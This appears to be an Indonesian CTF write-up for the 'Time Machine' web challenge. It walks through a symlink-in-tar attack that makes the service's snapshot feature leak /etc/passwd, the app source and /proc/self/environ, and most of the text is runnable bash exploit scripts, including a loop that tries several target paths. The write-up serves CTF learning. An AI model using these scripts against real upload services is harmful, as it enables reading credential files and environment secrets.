# Time Machine

## Ringkasan

Service menyediakan fitur upload archive lewat endpoint `/restore`, lalu membuat arsip ulang lewat endpoint `/snapshot`.

Bug utamanya ada di validasi archive. Aplikasi mengecek nama file di dalam archive, tetapi tidak mengecek target symlink. Akibatnya, archive berisi symlink dengan nama aman seperti `leak` bisa diterima. Ketika snapshot dibuat, `shutil.make_archive()` mengikuti symlink tersebut dan memasukkan isi file target ke dalam `snapshot.zip`.

Flag akhirnya didapat dari environment process lewat symlink ke:

```
/proc/self/environ
```

Flag:

```
THJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}
```

## File Challenge

Target:

```
http://chal.thjcc.org:9005/
```

Deskripsi challenge:

```
Upload your archives.
Snapshot what you need.
Powered by Python's shutil.
```

Endpoint yang terlihat dari halaman utama:

```
POST /restore     # upload archive
GET  /snapshot    # download snapshot.zip
POST /reset       # clear files
GET  /view?path=  # melihat file hasil restore
```

## Analisis Awal

Saat halaman utama diakses, service menampilkan form upload archive. Tipe file yang diterima:

```
.zip
.tar
.tar.gz
.tgz
.tar.bz2
.tar.xz
```

Setelah upload berhasil, server membalas `302 FOUND` dan memberikan cookie session. Cookie ini wajib dipakai lagi saat mengambil `/snapshot`, karena workspace file disimpan per-session.

Tanpa cookie yang sama, snapshot yang diunduh kosong.

Contoh masalah awal:

```
snapshot.zip: Zip archive data (empty)
warning [snapshot.zip]: zipfile is empty
```

Setelah memakai cookie jar dengan `curl -c` dan `curl -b`, file biasa berhasil masuk ke snapshot.

## Validasi Session

Command untuk membuktikan session sudah benar:

```bash
cd ~/TimeMachine
source /home/nata/ctf_env/bin/activate

URL="http://chal.thjcc.org:9005"
COOKIE="cookie.txt"

rm -f "$COOKIE"
rm -rf work payload.tar snapshot.zip out

curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$URL/reset" >/dev/null

mkdir work
echo "SESSION_TEST_123" > work/test.txt
tar -cf payload.tar -C work test.txt

curl -s -i -c "$COOKIE" -b "$COOKIE" -F "archive=@payload.tar" "$URL/restore" | head -n 20

curl -s -b "$COOKIE" "$URL/" | grep -E "test.txt|SESSION_TEST|FILE|LINK|Nothing" -n

curl -s -L -b "$COOKIE" "$URL/snapshot" -o snapshot.zip

unzip -l snapshot.zip
rm -rf out
mkdir out
unzip -oq snapshot.zip -d out
find out -maxdepth 2 -type f -ls
cat out/test.txt
```

Output penting:

```
test.txt
SESSION_TEST_123
```

Ini membuktikan upload dan snapshot sudah berada di session yang sama.

## Analisis Source

Source aplikasi berhasil dibaca melalui snapshot symlink ke:

```
/app/app.py
/proc/self/cwd/app.py
```

Potongan penting dari source:

```python
WORKSPACE = os.environ.get("WORKSPACE", "/var/timemachine")
ALLOWED_NAME = re.compile(r"^[\w.\-]{1,64}$")

def escapes(name: str) -> bool:
    if not name:
        return True
    if name.startswith("/") or os.path.isabs(name):
        return True
    return ".." in name.replace("\\", "/").split("/")
```

Fungsi `escapes()` memvalidasi `name`, bukan target symlink. Karena itu nama `leak` dianggap aman walaupun symlink-nya menunjuk ke file di luar folder restore.

Dari output `/view?path=leak`, terlihat route view menolak symlink keluar folder:

```
403 Forbidden
That path is not inside your restore directory.
```

Namun `/snapshot` masih bisa membocorkan isi target symlink karena proses archive mengikuti link.

## Percobaan Symlink

Test dengan `/etc/passwd` membuktikan snapshot mengikuti symlink:

```bash
URL="http://chal.thjcc.org:9005"
COOKIE="cookie.txt"

rm -f "$COOKIE"
curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$URL/reset" >/dev/null

rm -rf work payload.tar snapshot.zip out
mkdir work
ln -s /etc/passwd work/passwd

tar -cf payload.tar -C work passwd

curl -s -i -c "$COOKIE" -b "$COOKIE" -F "archive=@payload.tar" "$URL/restore" | head -n 20

curl -s -L -b "$COOKIE" "$URL/snapshot" -o snapshot.zip

rm -rf out
mkdir out
unzip -oq snapshot.zip -d out
cat out/passwd | head
```

Output:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
app:x:1000:1000::/home/app:/bin/sh
```

Ini menjadi bukti bahwa isi target symlink masuk ke snapshot.

## Eksploit Final

Flag tidak berada di `/flag`, tetapi di environment variable process. Karena process Flask berjalan di container yang sama, `/proc/self/environ` dapat dibaca lewat symlink saat snapshot dibuat.

Command final:

```bash
cd ~/TimeMachine
source /home/nata/ctf_env/bin/activate

URL="http://chal.thjcc.org:9005"
COOKIE="cookie.txt"

rm -f "$COOKIE"
rm -rf work payload.tar snapshot.zip out

curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$URL/reset" >/dev/null

mkdir work
ln -s /proc/self/environ work/leak

tar -cf payload.tar -C work leak

curl -s -c "$COOKIE" -b "$COOKIE" -F "archive=@payload.tar" "$URL/restore" >/dev/null

curl -s -L -b "$COOKIE" "$URL/snapshot" -o snapshot.zip

rm -rf out
mkdir out
unzip -oq snapshot.zip -d out

cat out/leak
```

Output berisi environment variable:

```
HOSTNAME=...
SECRET_KEY=...
HOME=/home/app
...
PWD=/app
FLAG=THJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}
```

## One-liner Pencarian Target

Command ini dipakai untuk mencoba beberapa target lokal secara aman di scope challenge:

```bash
URL="http://chal.thjcc.org:9005"
COOKIE="cookie.txt"

for TARGET in \
  /flag \
  /flag.txt \
  /app/flag \
  /app/flag.txt \
  /app/app.py \
  /proc/self/environ \
  /proc/self/cwd/app.py \
  /etc/passwd
do
  echo
  echo "=============================="
  echo "[*] trying $TARGET"
  echo "=============================="

  rm -f "$COOKIE"
  rm -rf work payload.tar snapshot.zip out
  mkdir work

  curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$URL/reset" >/dev/null

  ln -s "$TARGET" work/leak
  tar -cf payload.tar -C work leak

  curl -s -c "$COOKIE" -b "$COOKIE" -F "archive=@payload.tar" "$URL/restore" >/dev/null

  echo "[+] /view?path=leak:"
  curl -s -b "$COOKIE" "$URL/view?path=leak" | head -c 1000
  echo

  echo "[+] snapshot:"
  curl -s -L -b "$COOKIE" "$URL/snapshot" -o snapshot.zip

  rm -rf out
  mkdir out
  unzip -oq snapshot.zip -d out 2>/dev/null || true

  if [ -e out/leak ]; then
    cat out/leak | head -c 1000
    echo
  else
    echo "no out/leak"
  fi
done
```

## Kenapa /view Gagal tapi /snapshot Berhasil

`/view?path=leak` mengembalikan:

```
403 Forbidden
That path is not inside your restore directory.
```

Artinya route view melakukan pengecekan path final sehingga symlink keluar workspace ditolak.

Namun `/snapshot` membuat ZIP dari semua file di workspace. Saat membuat ZIP, `shutil` mengikuti symlink dan membaca isi target. Jadi file symlink tidak bisa dilihat langsung lewat `/view`, tetapi bisa dibocorkan lewat hasil snapshot.

## Algoritma Eksploit

Alur eksploit:

1. Buat symlink lokal bernama `leak -> /proc/self/environ`
2. Masukkan symlink ke tar archive
3. Upload archive ke `/restore` dengan cookie session
4. Ambil `snapshot.zip` dari `/snapshot` memakai cookie yang sama
5. Extract `snapshot.zip`
6. Baca `out/leak`
7. Ambil nilai `FLAG` dari environment

## Cara Menjalankan

```bash
bash exploit.sh
```

Atau jalankan command manual dari bagian Eksploit Final.

## Flag

```
THJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}
```
